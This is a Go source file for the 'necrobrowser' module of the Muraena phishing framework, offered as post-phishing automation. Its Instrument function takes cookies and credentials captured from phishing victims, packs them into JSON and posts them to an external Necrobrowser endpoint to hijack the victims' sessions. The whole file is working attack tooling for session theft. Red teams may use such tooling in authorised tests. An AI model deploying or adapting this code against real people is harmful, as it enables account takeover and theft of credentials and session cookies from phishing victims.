package necrobrowser

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation via Necrobrowser-NG"

	// Author of this module
	Author = "Muraena Team"

	// Placeholders for templates
	CookiePlaceholder      = "%%%COOKIES%%%"
	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Profile  string

	Request string
}

// Cookies
type SessionCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Expires  int64  `json:"expirationDate"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
}

// VictimCredentials structure
type VictimCredentials struct {
	Key   string
	Value string
	Time  time.Time
}

// Name returns the module name
func (module *Necrobrowser) Name() string {
	return Name
}

// Description returns the module description
func (module *Necrobrowser) Description() string {
	return Description
}

// Author returns the module author
func (module *Necrobrowser) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Necrobrowser) Prompt(what string) {}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.NecroBrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.NecroBrowser
	m.Endpoint = config.Endpoint

	m.Profile = config.Profile
	bytes, err := ioutil.ReadFile(m.Profile)
	if err != nil {
		m.Warning("Error reading profile file %s: %s", m.Profile, err)
		m.Enabled = false
		return
	}

	m.Request = string(bytes)

	return
}

func (module *Necrobrowser) Instrument(cookieJar []http.Cookie, credentialsJSON string) {

	var necroCookies []SessionCookie
	for _, c := range cookieJar {

		nc := SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  c.Expires.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HttpOnly,
			Secure:   c.Secure,
			Session:  c.Expires.Unix() < 1,
		}

		necroCookies = append(necroCookies, nc)
	}

	c, err := json.MarshalIndent(necroCookies, "", "\t")
	if err != nil {
		module.Warning("Error marshalling the cookies: %s", err)
		return
	}

	cookiesJSON := string(c)
	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)

	client := resty.New()
	resp, err := client.R().
		SetHeader("Content-Type", "application/json").
		SetBody(module.Request).
		Post(module.Endpoint)

	if err != nil {
		return
	}

	module.Info("NecroBrowser Response: %+v", resp)
	return
}
